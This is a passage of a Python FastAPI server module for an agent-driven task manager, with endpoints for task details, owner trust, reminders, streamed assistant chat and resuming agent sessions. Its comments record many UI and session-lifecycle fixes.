    if not store.get_task(task_id): raise HTTPException(404, 'task not found')
    from . import workerstate as ws
    try: out = ws.answer_group(store, task_id, body.answers, ACTOR)
    except ValueError as e: raise HTTPException(422, str(e))
    if not out['delivered']:
        raise HTTPException(409 if out['state'] in ('resolved', 'stale') else 422, f"{out['state']}: {out.get('why') or ''}")
    return out


@app.post('/api/tasks/{task_id}/worker/release')
def worker_release(task_id: int):
    """Answer in the terminal instead: a held ask lets go, and Claude draws its own form in the pane."""
    from . import workerstate as ws
    return {'released': ws.release(task_id)}


@app.post('/api/tasks/{task_id}/trust')
def task_trust(task_id: int, scope: str = ''):
    """The owner vouches for everything on this task so far (origin.raise_to). Not on guard.AGENT_WRITES, so a session
    cannot vouch for itself; a stranger who writes afterwards lowers it again. `scope` 'org': for the sender's whole organisation
    (senders.trust_org) - everyone at that domain, by mail or Teams, from now on."""
    from . import origin, senders
    if not store.get_task(task_id): raise HTTPException(404, 'task not found')
    org = None
    if scope == 'org':
        try: org = senders.trust_org(store, task_id, ACTOR)
        except ValueError as e: raise HTTPException(422, str(e))
    else: origin.raise_to(store, task_id, 'trusted', ACTOR)
    o, why = origin.of_task(store, task_id)
    return {'origin': o, 'why': why, **({'org': org} if org else {})}

def _calendar_of(task_id: int):
    from . import calwrite
    try: return calwrite.of_task(store, task_id)
    except Exception as e:
        logger.debug(f'task {task_id}: the calendar ask was not read - {e}'); return None

def _earlier(d: dict) -> list:
    """The messages a triage verdict on this task named as what its ask rests on, not already the task's own."""
    own, out = {m['MessageId'] for m in d.get('messages') or []}, []
    for r in d.get('routes') or []:
        try: ids = (json.loads(r.get('VerdictJson') or '{}') or {}).get('rests_on') or []
        except (ValueError, TypeError, AttributeError): continue
        for mid in ids:
            if mid in own or any(m['MessageId'] == mid for m in out): continue
            if (m := store.get_message(mid)): out.append(_readable(m))
    # ...and the message a task was MADE FROM without being moved onto it - the owner's own promise, an Advisor idea on a closed
    # task's mail (store.made_from). Came from showed only "from email · made 3d ago" (the owner, 2026-10-26: "need more info
    # where this came from? what sent email/message/chat etc")
    for m in store.made_from(d.get('task') or {}):
        if m['MessageId'] not in own and not any(x['MessageId'] == m['MessageId'] for x in out): out.append(_readable(m))
    return out


@app.get('/api/tasks/{task_id}')
def task_detail(task_id: int):
    d = store.task_detail(task_id)
    if not d: raise HTTPException(404, 'task not found')
    # a session that has ended still leaves work to close out, so the page has to know one
    # happened - the Done and Pause buttons used to vanish with the pty
    tr = store.last_transcript(task_id)
    rs = _resumable(task_id)[0]
    from . import concierge, origin, workflows
    # ...and whether its channel can carry a reply, as /api/reviews says: without it a Teams draft offered Send, and
    # the press came back "not sent" instead of the card offering Copy & close from the start
    memo = {}
    for r in d.get('reviews') or []:
        r['CanSend'], r['SendBlock'] = _review_send_state(memo, r)
    from . import batch as _batch
    batch_rows = store.batch_items(task_id)
    batch_outside = bool(batch_rows) and _batch.outside(store, task_id)
    session = hub_term.for_task(task_id, tail=3, details=False)
    judged, ran, story = _brainroute().judged(store, task_id), _workerstate().ended(store, task_id), _agent_story(task_id)
    # "Run again on the strong model" is offered only on an open task whose agent failed or whose reader was unsure (TaskPage's
    # ▾): asking the router on every other open cost ~11 ms a task, 2.7x what an open cost in 0.3.9.34 (2026-10-26)
    strong = _brainroute().strong_offered(d['task'], judged, ran, story)
    return {**d,'task': {**d['task'], 'Playbook': _playbook_brief(d['task'])},
            'origin': {**dict(zip(('origin', 'why'), origin.of_task(store, task_id))),     # who's words are on it (origin.py)
                       # ...and what one of them tries to make an AI do, as triage or ranking read it (message.Danger)
                       'danger': next((m['Danger'] for m in store.list_messages(task_id) if m.get('Danger')), None)},
            # the same sender writing again and again about this one thing, said once (concierge.repeats) - counted here, no model
            'repeats': concierge.repeats(store, task_id, d.get('messages'), d.get('routes')),
            # a WORKFLOW RUN has no message and no triage behind it: which workflow, and what started it (workflows.of_task)
            'workflow': workflows.of_task(store, d['task']),
            # an invite waiting on the owner, or a thread asking for a time: the row's Accept / Decline / Propose a new time / Find a time
            'calendar': _calendar_of(task_id),
            'messages': [_readable(x) for x in d.get('messages') or []],
            # ...and the earlier messages triage said its ask rests on, shown with them, never moved onto this task (rests_on, 2026-10-22)
            'earlier': _earlier(d),
            'artifacts': [_artifact_row(a) for a in d.get('artifacts') or []],
            # The detail page only needs lifecycle here; its terminal pane and optional WorkStrip
            # load their own rich data. Do not block selecting a task on git status.
            'session': session,
            # ...and what the task IS, the list's own State (taskstate): the table opens a task with no list row, and without it an
            # agent's own close read "stopped and saved" and opened on Close out (the owner, 2026-10-21)
            'state': _task_state(task_id, d, session),
            # ...and who closed it and why, one line, when its agent did (taskstate.closed_why)
            'closedWhy': taskstate.closed_why(store, d['task'], d.get('comments')),
            # ...and how its last run ENDED, in the run's own word (finished / failed / stopped / disconnected) - what taskstate read
            'runEnded': ran,
            'transcript': {'sid': tr['Sid'], 'agent': tr['Agent'], 'cwd': tr['Cwd'], 'brain': tr['Brain'],
                           'at': tr['CreatedAt'], 'chars': len(tr['Text'] or '')} if tr else None,
            # ...and WHICH BRAIN ACTUALLY RAN IT, for a session that has ended (_ran_on)
            'ranOn': _ran_on(task_id, tr),
            # ...and why the router put its last AI call on that brain, for the AI pill's tooltip (brainroute.why_for_task)
            'routeWhy': _brainroute().why_for_task(store, task_id),
            # ...and how hard its work is, how sure its reader was, what data it carries - triage's word or the owner's (brainroute.judged)
            'judged': judged,
            # ...and whether a re-run on a strong model is there to offer (the ▾'s "Run again on the strong model"), and on which brain
            'strongAgain': (lambda j: {'pick': j[1], 'brain': _brainroute()._said(store, j[1]), 'model': j[2]} if j[1] else None)(_strong_again_of(d['task']) if strong else ('', '', '')),
            # ...and what the agent step says when nothing is live: why it never started, or what it did before it went
            'agentStory': story,
            # ...and whether Fix it can run on its items: an outsider's only in GitHub's cloud, and only once the owner turned that
            # on - a button that could only say "turn it on" was offered anyway (the owner, 2026-10-12: "what does this do?")
            'batchOutside': batch_outside,
            # ...and what ended it upstream (a merge, a close): Close out says that instead of an empty reply nobody is owed
            'ended': _ended_line(task_id, d.get('comments')),
            # ...and Stop and save's write-up, running or just ended: Close out draws its stage until the draft replaces it (writeup.state)
            'writeup': _writeup_state(task_id),
            # ...and a BATCH's items, in ranked order, each with what the agent found and where it stands (batch.py)
            # (Warn: what ranking judged its text tries to make an agent do - a warning on the row, rank._order)
            'batch': [{k: i.get(k) for k in ('Place', 'Title', 'Link', 'State', 'Result', 'Overlap', 'EndedWhy', 'Propose', 'Fix', 'FixLink', 'Warn')}
                      | {'reviewed': bool(i.get('Sha')), 'canFix': True} for i in batch_rows] or None,
            # ...and whether that ended session can be REOPENED rather than replaced. The id itself
            # stays here: the page needs to know a conversation is waiting, not how to address it.
            'resumable': {'sid': rs['Sid'], 'agent': rs['Agent'], 'cwd': rs['Cwd'], 'at': rs['CreatedAt']} if rs else None}


def _task_state(task_id: int, d: dict, session=None):
    """taskstate.state for one task's page, from the detail already read - its latest review and run as the list row carries them."""
    try:
        rv = (d.get('reviews') or [{}])[0]
        rn = max(d.get('runs') or [{}], key=lambda r: r.get('RunId') or 0)
        t = {**d['task'], 'ReviewStatus': rv.get('Status'), 'RunStatus': rn.get('Status')}
        return taskstate.state(store, t, session, store.get_dispatch(task_id))
    except Exception as e:
        logger.debug(f'task {task_id}: state skipped - {e}'); return None


def _writeup_state(task_id: int):
    from . import writeup
    return writeup.state(task_id)


def _ended_line(task_id: int, comments=None):
    from .channels import ended_line
    try: return ended_line(store, task_id, comments)
    except Exception as e:
        logger.debug(f'task {task_id}: ended line skipped - {e}'); return None


def _agent_story(task_id: int):
    """funnel.agent_story, never in the way of opening the task: a broken story is a missing line, not a 500."""
    from . import funnel
    try: return funnel.agent_story(store, task_id)
    except Exception as e:
        logger.debug(f'task {task_id}: agent story skipped - {e}'); return None


def _brainroute():
    from . import brainroute
    return brainroute


def _ran_on(task_id: int, tr=None):
    """Which brain actually ran this task's last session, once that session is gone.

    A LIVE session says so itself - general.info reports the connector it reached for, a pty says
    its CLI - and the card reads that first. A CLOSED one said nothing, so the card fell back to the
    CODING ROSTER, which names the brain a role WOULD run on today: a researcher session that ran on
    the owner's Azure OpenAI connector came back an hour later labelled "brain claude", the default
    for a role with no override (the owner, 2026-09-22: "claude did not open but azure openai did").

    Both records exist. A general session saves its pick and model to resume from (store.save_session:
    'connector:7', 'gpt-5.4'), and a pty session's transcript carries the brain it ran. The newer of
    the two is what ran last, and a connector is named as the owner named it, not by its type."""
    saved = store.saved_session(task_id) or {}
    pick, when = str(saved.get('Pick') or ''), str(saved.get('UpdatedAt') or '')
    if pick and (not tr or when >= str(tr['CreatedAt'] or '')):
        if pick.startswith('connector:'):
            c = store.get_connector(int(pick.split(':', 1)[1])) or {}
            name = c.get('Name') or c.get('Type') or 'AI connector'
        else: name = pick.split(':', 1)[-1] or pick
        return {'brain': name, 'model': saved.get('Model') or ''}
    if tr and tr['Brain']: return {'brain': tr['Brain'], 'model': ''}
    return None


def _resumable(task_id: int):
    """(the session this task can be continued from, why it cannot). One judgement for the button
    and the door behind it, so the page never offers what the endpoint will refuse."""
    row = store.resumable_session(task_id)
    if not row: return None, 'no saved session to continue - that agent never named a conversation we can reopen'
    if not store.get_agent(row['Agent'] or ''):
        return None, f'the profile "{row["Agent"]}" is no longer configured; use Run another agent'
    if not (row['Cwd'] and Path(row['Cwd']).is_dir()):
        return None, f'the checkout it worked in no longer exists: {row["Cwd"]}'
    return row, ''

def _workerstate():
    from . import workerstate
    return workerstate


def _assistant_payload(task_id: int, session=None):
    from . import general, proposals as _proposals
    task = store.get_task(task_id)
    if not task: raise HTTPException(404, 'task not found')
    if not general.handles(task):
        raise HTTPException(422, 'assistant view is available for general, research, marketing, and triage tasks')
    session = session or general.session_for(task_id)
    messages = general.history(store, task_id)
    # each page or picture belongs to the answer that made it: the turn files its answer after what it published or showed,
    # so it is the first answer stamped at or after it (both stamps are store._now()); one with none yet waits at the foot
    answers = [(str(m.get('createdAt') or ''), m['id']) for m in messages if m['role'] == 'assistant']
    published = [{**r, 'after': next((mid for at, mid in answers if at >= str(r.get('created_at') or '')), None)}
                 for r in (_artifact_row(a) for a in store.list_task_artifacts(task_id) if a.get('Kind') in ('claude_artifact', 'shown'))]
    from . import outputs
    return {'messages': messages,
            # the files the agent made for this task (outputs.py): listed on the canvas, and a chip where an answer names one
            'outputs': outputs.listing(task_id),
            # ONE ENTRY PER CLI, and only the installed ones: this listed a provider per worker
            # profile, so five profiles on Claude read as five brains (the owner, 2026-09-18).
            'providers': general.brain_options(store, keep=general.default_pick(store, task)),
            # what the chat WOULD run on if nobody picks: the picker showed providers[0] instead,
            # which is always a CLI, so a task with no session nominated a coding agent (TQ-0420)
            'defaultPick': general.default_pick(store, task),
            # a walk whose session is still being opened is WORK IN FLIGHT, not an idle conversation
            'starting': task_id in general.OPENING,
            # THE RAISED HAND, where the owner is standing. The agent's question and the answers it
            # offered have been recorded since PW-225 and nothing ever showed them: the workspace got
            # the prose ("tell me when you're signed in") and the two choices it named were never
            # clickable anywhere (2026-09-15). The chip said "needs you"; the question did not.
            # ...from WHICHEVER run is live on the task: an agent asking from a terminal on a general task drew "Agent asked you
            # something" over an empty canvas, its question only in the rail row's hover (the UI audit's W6, 2026-10-21)
            'asking': (_workerstate().asking_of(store, asker) if (asker := session or _workerstate()._live(task_id)) else None),
            # pages its Claude session published (claude_artifacts) and files it chose to show (selfclose.SHOW_LINE) - the
            # conversation draws each under the answer that made it, and lists any it cannot place at its foot
            'published': published,
            # A PLAYBOOK DRAFTED IN THIS CONVERSATION IS APPROVED IN IT (the owner, 2026-10-21): "Draft ready on the task" pointed at
            # Close out, which a live session hides - Approve was reachable only after Stop and save, which nothing said to press
            'playbookDrafts': [r for r in store._rows("SELECT * FROM review WHERE TaskId=? AND Kind='action' AND Status='pending' "
                                                       "ORDER BY ReviewId", (task_id,))
                               if _proposals._action(r) in ('write_playbook', 'amend_playbook')],
            # ...AND A HELD BROWSER ACT, the same way (2026-10-25): its card sat inside the hidden Close out, so the owner reached it only
            # by Stop and save - which closed the agent's browser, and then Approve said "the agent's browser is closed"
            'browserActs': [r for r in store._rows("SELECT * FROM review WHERE TaskId=? AND Kind='action' AND Status='pending' "
                                                   "ORDER BY ReviewId", (task_id,)) if _proposals._action(r) == 'browser_act'],
            'session': session.info(tail=3) if session else None}

@app.get('/api/tasks/{task_id}/assistant')
def assistant_state(task_id: int):
    return _assistant_payload(task_id)

@app.post('/api/tasks/{task_id}/assistant/session')
def assistant_session(task_id: int, body: AssistantSessionBody = None):
    from . import general
    body = body or AssistantSessionBody()
    # Opening a FINISHED chat must not resurrect it. GeneralWorkspace posts here on mount, so
    # merely LOOKING at a closed conversation started a live session; it parked with nothing to
    # answer, and BoardView.laneOf - which reads a session that began after ClosedAt as "somebody
    # picked this back up" - filed a done task under Waiting on you, where TQ-0291 sat for
    # forty-five minutes. Reading a closed conversation is reading, not resuming. Sending a
    # message still starts one, because that IS picking it back up.
    t = store.get_task(task_id) or {}
    if t.get('Status') in ('done', 'dropped') and not general.session_for(task_id):
        return _assistant_payload(task_id)
    # The dock and WhatsApp are two views of one assistant. Choosing its provider here is a
    # configuration change, not a tab-local preference that vanishes on restart.
    if general.is_dock(t) and body.pick:
        store.set_setting('assistant_ai', str(body.pick), ACTOR)
        store.set_setting('assistant_model', str(body.model or ''), ACTOR)
    try: session = general.start_session(store, task_id, body.connector_id, body.model, ACTOR, body.pick)
    except (ValueError, RuntimeError) as e: return _chat_failed(e)
    return _assistant_payload(task_id, session)


def _chat_failed(e):
    "A chat that could not start or answer, said once with its fix (failures.classify): a signed-out CLI read as an app bug (2026-10-25)."
    from . import failures
    c = failures.classify(e, act='assistant.message')
    return JSONResponse(status_code=422, content={'detail': c['sentence'], 'fix': c['fix'], 'retry': c['retry']})

CLOSED_CHAT = (f"This task is closed. Press {buttons.label('reopen')}, then {buttons.label('continue')}, "
               'to pick the conversation back up.')

def _refuse_closed_chat(task_id: int):
    """A CLOSED task's conversation is read-only. Typing into it started a live session on a done task: the pane said
    "assistant is waiting on you" over a task that read done, and the bar offered only Reopen (the owner, 2026-10-14: "we need
    to have general agent closed until i reopen and then continue session"). Reopen, then Continue, picks it up. The
    dock - the assistant that runs Taskuary - is never a task you close, so it is never refused."""
    from . import general
    t = store.get_task(task_id) or {}
    if t.get('Status') in ('done', 'dropped') and not general.is_dock(t): raise HTTPException(409, CLOSED_CHAT)

@app.post('/api/tasks/{task_id}/assistant/messages')
def assistant_message(task_id: int, body: AssistantMessageBody):
    from . import general
    _refuse_closed_chat(task_id)
    try:
        _refresh_chat_context(task_id=task_id)
        session = general.start_session(store, task_id, body.connector_id, body.model, ACTOR, body.pick)
        reply = session.send_prompt(body.text, body.attachments, body.connector_id, body.model, pick=body.pick)
    except (ValueError, RuntimeError) as e: return _chat_failed(e)
    return {'reply': reply, **_assistant_payload(task_id, session)}

@app.post('/api/tasks/{task_id}/assistant/browser')
def assistant_browser(task_id: int):
    """Give THIS conversation a browser, now.

    A browser only ever arrived with the task: the needs:browser mark is set when the task is made
    (the New task dialog's checkbox, or a set-up walk), and nothing in the agent tab could add it
    afterwards. So a chat that turned out to need a page had no way to get one, and the owner asked
    why a browser never showed up there (2026-09-14). Pressing this IS the mark: the task carries it
    from now on, and a session already running gets its Chrome without being restarted.
    """
    from . import browserview, general
    task = store.get_task(task_id)
    if not task: raise HTTPException(404, 'task not found')
    if not general.handles(task): raise HTTPException(422, 'a browser belongs to an assistant conversation')
    if not browserview.installed():
        raise HTTPException(422, f"agent-browser is not installed - {words.name('ai_apps')} lists it")
    store.tag_task(task_id, browserview.WANTS, actor=ACTOR)
    session = general.session_for(task_id)
    if session:
        session.browser_wanted = True                 # the next turn hands the CLI its browser brief
        threading.Thread(target=browserview.start, args=(session.sid,), daemon=True).start()
    return _assistant_payload(task_id, session)

@app.post('/api/tasks/{task_id}/assistant/cancel')
def assistant_cancel(task_id: int):
    """The stop button. The ONLY thing that stops an answer being written - walking away does
    not (see the stream's docstring)."""
    from . import general
    session = general.session_for(task_id)
    return {'stopped': bool(session and session.stop())}

@app.post('/api/tasks/{task_id}/assistant/stream')
async def assistant_stream(task_id: int, body: AssistantMessageBody):
    """NDJSON work stream for assistant-ui: the configured CLI's real tool/text events.

    The CLI stays on a worker thread (its subprocess pipes are blocking); events cross onto the
    request loop through a queue.

    Closing the browser stream DETACHES; it does not kill. It used to: leaving the Board tab,
    pressing refresh, or any remount of the pane ended the response - and since the reply is
    only filed once the run finishes, an answer that was seconds away was lost and the chat
    looked as though it had ignored the question. Stopping is now an explicit act
    (/assistant/cancel, the stop button), and a run nobody is watching still finishes and still
    files its reply on the task.
    """
    from . import general
    await run_in_threadpool(_refuse_closed_chat, task_id)    # before the stream opens: a plain 409 the composer can say (a store read: off the loop)
    loop, events, cancel = asyncio.get_running_loop(), asyncio.Queue(), threading.Event()

    def put(event):
        # the reader is gone: drop the event and keep working. The answer is filed on the task
        # either way, which is what the chat reads when it comes back.
        try: loop.call_soon_threadsafe(events.put_nowait, event)
        except RuntimeError: pass

    def trace(kind, name, detail):
        put({'type': kind, 'name': name, 'detail': detail})

    def work():
        try:
            fresh = _refresh_chat_context(task_id=task_id)
            if fresh.get('polled'):
                put({'type': 'tool_call', 'name': 'sync_messages',
                     'detail': {'new': fresh.get('added', 0)}})
            session = general.start_session(store, task_id, body.connector_id, body.model, ACTOR, body.pick)
            # ...said started only with an AI to start on: with none the step read "Started the selected agent" over a turn that
            # never could run (2026-10-22 walk) - send_prompt keeps the owner's words and fails saying why
            if session.pick: put({'type': 'start', 'session': session.info()})
            try:
                reply = session.send_prompt(body.text, body.attachments, body.connector_id, body.model,
                                            pick=body.pick, trace=trace, cancel=cancel)
            except RuntimeError as e:
                # it ended between being handed over and being spoken to (the owner closed the
                # pane, a wrap-up ran). A question is not lost over a race: start a fresh one
                # and ask it there, once.
                if 'has ended' not in str(e) or cancel.is_set(): raise
                general.drop_session(task_id)
                session = general.start_session(store, task_id, body.connector_id, body.model, ACTOR, body.pick)
                reply = session.send_prompt(body.text, body.attachments, body.connector_id, body.model,
                                            pick=body.pick, trace=trace, cancel=cancel)
            put({'type': 'done', 'reply': reply, 'payload': _assistant_payload(task_id, session)})
        # Once headers are streaming, FastAPI cannot replace this with its normal JSON error
        # response. Always terminate the NDJSON stream explicitly instead of leaving the UI's
        # spinner alive forever (missing CLI, provider/network errors, and bugs all land here).
        except Exception as e:
            # the browser shows this under the question now; the log is for the run nobody was
            # watching, and for the owner who can only report that nothing happened
            logger.warning(f'assistant stream for task {task_id} failed: {e}')
            put({'type': 'error', 'error': str(e)})

    threading.Thread(target=work, daemon=True).start()

    async def generate():
        try:
            while True:
                event = await events.get()
                yield json.dumps(event, default=str) + '\n'
                if event.get('type') in ('done', 'error'): break
        finally:
            # NOT cancel.set(): see the docstring. A browser that walked away is not a stop.
            if not cancel.is_set(): logger.debug(f'assistant stream for task {task_id} detached; the run continues')

    return StreamingResponse(generate(), media_type='application/x-ndjson',
                             headers={'Cache-Control': 'no-cache, no-transform'})

class RemindBody(BaseModel): until: str | None = None

@app.post('/api/tasks/{task_id}/remind')
def remind_task(task_id: int, body: RemindBody):
    """Remind me (the task page's picker): off the rail until that morning, Upcoming meanwhile. None brings it back."""
    from . import concierge, remind
    # ONE WRITER FOR ITS RECEIPT (the 2026-10-19 UI walk: a reminder's receipt printed twice, and the page's own copy was gone on reload):
    # put away from the Assistant's table, the server records the one line and hands its words back, and the page draws those same
    # words - the chat's read then takes them for the same turn (assistantTurns.sameTurn). Read before it runs: it leaves the table.
    # ...and since 2026-10-22 ("we don't need that text ever") the one writer stamps Remind me on the item's card instead of a line
    try: table = concierge.on_table(store, {'kind': 'task.defer', 'target': task_id})
    except Exception as e:
        logger.debug(f'on_table failed for a reminder on {task_id}: {e}'); table = False
    try: out = remind.set_reminder(store, task_id, body.until, ACTOR)
    except ValueError as e: raise HTTPException(409 if isinstance(e, remind.AgentOpen) else 404 if 'not found' in str(e) else 422, str(e))
    op = operations.record_direct(store, 'task.defer', task_id, {'until': body.until or 'none'}, ACTOR, out)
    if op and table:
        try: out = {**out, 'receipt': concierge.receipt_turn(store, op, ACTOR, table=True, press=True)['say']}; live_bus.emit(live_bus.CHAT)
        except Exception as e: logger.debug(f'no receipt recorded for the reminder on {task_id}: {e}')
    return out

@app.get('/api/tasks/{task_id}/remind/usual')
def remind_usual(task_id: int):
    """The day Remind me opens on (the owner's ruling 7, 2026-10-23: "Remind me opens with the learned day pre-chosen"): the weekday the
    How you work line about this sender says (usual.remind_day) - a line the owner can see and correct, written from their own put-offs
    (the owner, 2026-10-25) - {} while no line says one. Pre-chosen is not chosen: the picker shows it first, and nothing is set until
    the owner presses."""
    from . import usual
    if not store.get_task(task_id): raise HTTPException(404, 'task not found')
    try: return usual.remind_day(store, task_id) or {}
    except Exception as e:
        logger.debug(f'no usual day for {task_id}: {e}'); return {}

@app.get('/api/tasks/{task_id}/handoff/usual')
def handoff_usual(task_id: int):
    """Whom Hand it to a person opens on (the owner, 2026-10-25: "Hand it to a person pre-fills the usual recipient"): the person the
    owner handed this sender's asks to, twice or more (usual.handoff_usual) - {} while there is nobody. Chosen, not sent: the drawer
    fills the recipient, and the owner still presses Send it."""
    from . import usual
    if not store.get_task(task_id): raise HTTPException(404, 'task not found')
    try: return usual.handoff_usual(store, task_id) or {}
    except Exception as e:
        logger.debug(f'no usual recipient for {task_id}: {e}'); return {}

@app.patch('/api/tasks/{task_id}')
def update_task(task_id: int, body: TaskBody, background: BackgroundTasks = None):
    t = store.get_task(task_id)
    if not t: raise HTTPException(404, 'task not found')
    fields = {k: v for k, v in body.model_dump().items() if v is not None}
    # One task has one worker mode. Switching the kind from the assistant chat to coding (or
    # back to a human TODO) must close that live assistant session before the coding terminal
    # opens; otherwise both stayed registered on the task and the UI could attach to the wrong
    # one. The same rule lets the kind control move a live coding task into non-coding work.
    next_kind = fields.get('Kind')
    # what triage said, read BEFORE the write that overturns it - verdict_of_task reads the task's
    # current Kind, so capturing it afterwards would record the owner's answer as the verdict
    was_verdict = operations.verdict_of_task(store, task_id) if next_kind and next_kind != t.get('Kind') else None
    if next_kind and next_kind != t.get('Kind'):
        from . import general
        live = hub_term.session_for(task_id)
        if live and live.alive:
            is_chat = getattr(live, 'mode', '') == 'assistant'
            wants_chat = general.handles({'Kind': next_kind})
            if is_chat != wants_chat or next_kind == 'task': hub_term.close(live.sid)
    # Status done through here is Mark done too - the one close (concierge.close_task), whichever page sent it
    closing = fields.get('Status') == 'done' and t.get('Status') not in ('done', 'dropped')
    if closing: fields.pop('Status')
    store.update_task(task_id, fields, ACTOR)
    # the owner's own priority call is evidence: every task from one sender marked urgent by hand is a rule worth asking about (promote.py)
    if fields.get('Priority'):
        from .processing_order import level
        fields['Priority'] = level(fields['Priority'])
    if fields.get('Priority') and fields['Priority'] != level(t.get('Priority')):
        store.audit('task', task_id, 'priority', ACTOR, detail={'from': level(t.get('Priority')), 'to': fields['Priority']})
    if closing:
        from . import concierge
        concierge.close_task(store, task_id, ACTOR)
    if t.get('Status') in ('done', 'dropped') and fields.get('Status') in ('open', 'in_progress', 'waiting'):
        # A self-close is remembered in-process to prevent duplicate hooks. Reopening is a new
        # lifecycle, so a later automated run must be allowed to settle again.
        from . import selfclose
        selfclose.forget(task_id)
    # A task DROPPED (or one already closed, marked again) ends its agent too: a live session left
    # running on a finished task is an agent nobody is coming back for. close() files the transcript
    # first, so the record survives the pty as always. Mark done never reaches here - its Status was
    # popped above and concierge.close_task stopped the agent and settled the item itself.
    if fields.get('Status') in ('done', 'dropped'):
        live = hub_term.session_for(task_id)
        if live and live.alive:
            hub_term.close(live.sid)
            store.add_comment(task_id, ACTOR, 'human', 'Task closed - ended the live agent session with it.')
        # the same read receipt concierge.close_task writes: a task dropped leaves Unread too, and a
        # later arrival on it is unread again (the owner, 2026-09-07)
        if fields['Status'] == 'dropped' and t.get('Status') not in ('done', 'dropped'):
            from . import funnel as _funnel
            try: _funnel.settle(store, f'task:{task_id}', 'done', ACTOR, note='the task was closed')
            except Exception as e: logger.debug(f'the closed task did not settle its item: {e}')
    # The kind control is a VERDICT, not a field edit. It used to be the only door to "this is
    # mine, not the agent's" that taught nothing - the tray button beside it reached the identical
    # end state and wrote the lesson - so the owner's correction was given and dropped on the floor
    # (TQ-0501, 2026-09-11). Same judgement, same learning, whichever control they reach for.
    if next_kind and next_kind != t.get('Kind') and next_kind in task_kinds.TRIAGE:
        # moving it OFF the agent entirely is the button's judgement, so it writes the button's
        # four records. general/coding are still agent work - a weaker signal, the routing fact only.
        if next_kind == 'task': _teach_not_coding(task_id, t, was_verdict, None, True, background)
        else: _teach_routing(task_id, 'kind', next_kind, background=background)
    # ...and WHICH worker: reassigning the profile overturns triage's `profile`, the field that
    # decided an analyst read a timesheet ask in a bank-feeds checkout.
    who = str(fields.get('Assignee') or '')
    if who.startswith('agent:') and who != str(t.get('Assignee') or ''):
        _teach_routing(task_id, 'profile', who.split(':', 1)[1], background=background)
    # "This is not a coding task - it just needs an answer." Changing the kind to reply IS that
    # verdict, so the task enters the review queue the way a question would have at triage:
    # a draft review appears (auto-drafted when that is on), instead of a repo session.
    if fields.get('Kind') == 'reply' and t.get('Kind') != 'reply':
        mid = reply_target(store, task_id)
        if mid and not store.pending_review(task_id):
            rid = store.add_review({'TaskId': task_id, 'MessageId': mid, 'Kind': 'draft', 'Status': 'pending',
                                    'Reason': 'reclassified by you: a question, not work to do - needs a reply'})
            store.add_comment(task_id, ACTOR, 'human', 'Reclassified as a question - it needs an answer, not an agent.')
            if background is not None:
                # always drafted (PW-043) and guarded like ingest's auto-draft: no AI connected means
                # a review waiting in the queue with the failure written on it, never an exception
                from .ingest import _auto_draft
                background.add_task(_auto_draft, store, task_id, rid)
        # a reclassification is a triage verdict the owner had to overturn - worth generalizing
        if background is not None:
            background.add_task(learn.learn_from, store,
                                f"{task_ref(task_id)}: owner reclassified \"{(t.get('Title') or '')[:80]}\" from a "
                                'coding task to a question needing only a reply - triage over-reached')
    return {'ok': True}

@app.post('/api/tasks/{task_id}/code')
def code(task_id: int, background: BackgroundTasks, body: CodeBody = None):
    """Put the CLI on this task - in a REAL session, like every other way of starting one. This
    used to be the headless path (pipes, no window, a report you read afterwards); nothing starts
    where you cannot watch it, interrupt it or answer it, so it is now the same as /dispatch."""
    if not store.get_task(task_id): raise HTTPException(404, 'task not found')
    agent = (body.agent if body else None) or hub_agents.default_agent(store)
    if not store.get_agent(agent): raise HTTPException(422, f'unknown agent: {agent}' if agent else 'no coding agent is set up to take it')
    ses = start_session(store, task_id, agent, (body.model if body else None), (body.instruction if body else None),
                        brain=getattr(body, 'brain', None))
    return {'start': 'session', 'agent': agent, 'model': (body.model if body else None), 'session': ses}

@app.post('/api/tasks/{task_id}/continue')
def continue_task(task_id: int, body: CodeBody):
    """Continue completed coding work without pretending a dead PTY is still alive.

    The transcript is the durable session record. Reopen the same configured agent in the same
    checkout and seed the new terminal with the owner's next instruction plus the saved result.
    If that agent profile was removed, stop and say so instead of silently changing profiles.
    """
    task = store.get_task(task_id)
    if not task: raise HTTPException(404, 'task not found')
    instruction = str(body.instruction or '').strip()
    if not instruction: raise HTTPException(422, 'say what code changes you want next')
    _refresh_chat_context(task_id=task_id)
    previous = store.last_transcript(task_id) or {}
    if hub_term.for_task(task_id): raise HTTPException(409, 'this task already has a live coding session')
    from . import agents as hub_agents
    # An explicit picker choice means "restart with this harness". Falling back to the previous
    # transcript preserves the convenient same-agent continue path.
    agent = str(body.agent or previous.get('Agent') or hub_agents.default_agent(store)).strip()
    if not store.get_agent(agent):
        raise HTTPException(422, f'the previous profile "{agent}" is no longer configured; choose an agent from Start session'
                            if agent else f"no coding profile is set up - add one under {words.name('profiles')}")
    try:
        session = hub_term.start_on_task(store, task_id, agent, body.model, instruction, ACTOR,
                                         brain=getattr(body, 'brain', None),
                                         cwd=previous.get('Cwd') or None)
    except (ValueError, RuntimeError, FileNotFoundError) as e:
        raise HTTPException(422, str(e))
    store.audit('task', task_id, 'continue', ACTOR,
                detail={'agent': agent, 'fromSid': previous.get('Sid'), 'cwd': previous.get('Cwd')})
    return {'continued': True, 'agent': agent, 'fromSession': previous.get('Sid'), 'session': session}


@app.post('/api/tasks/{task_id}/continue-session')
def continue_session(task_id: int, body: CodeBody = None):
    """Reopen the agent's OWN conversation, by the id its CLI gave it.

    Not /continue, which starts a FRESH pane seeded with the handover note - a new agent reading
    about what the last one did. Here the CLI still holds what it read, changed and asked, so the
    prompt is only 'carry on'. The session id is the assistant's trick (session_resume) applied to
    a pty: filed when a hook or a rollout names it, so a restart cannot take it away.
    """
    task = store.get_task(task_id)
    if not task: raise HTTPException(404, 'task not found')
    if task.get('Status') == 'dropped': raise HTTPException(409, 'This task was dismissed.')
    if hub_term.for_task(task_id): raise HTTPException(409, 'this task already has a live session')
    row, why = _resumable(task_id)
    if not row: raise HTTPException(409, why)
    # continuing IS live work again, whatever the card said: a finished task comes back to the work
    # tab rather than having an agent run invisibly behind a done row (the owner, 2026-09-15)
    if task.get('Status') not in ('open', 'waiting', 'in_progress'):
        store.update_task(task_id, {'Status': 'in_progress'}, ACTOR)
    try:
        session = hub_term.start_on_task(store, task_id, row['Agent'], (body.model if body else None),
                                         (body.instruction if body else None), ACTOR,
                                         cwd=row['Cwd'], resume=row['ExtId'],
                                         # the id belongs to the CLI that made it: resuming a codex conversation on the default
                                         # brain ran `claude --resume <codex id>` - "No conversation found with session ID"
                                         brain=row.get('Brain') or None)
    except (ValueError, RuntimeError, FileNotFoundError) as e:
        raise HTTPException(422, str(e))
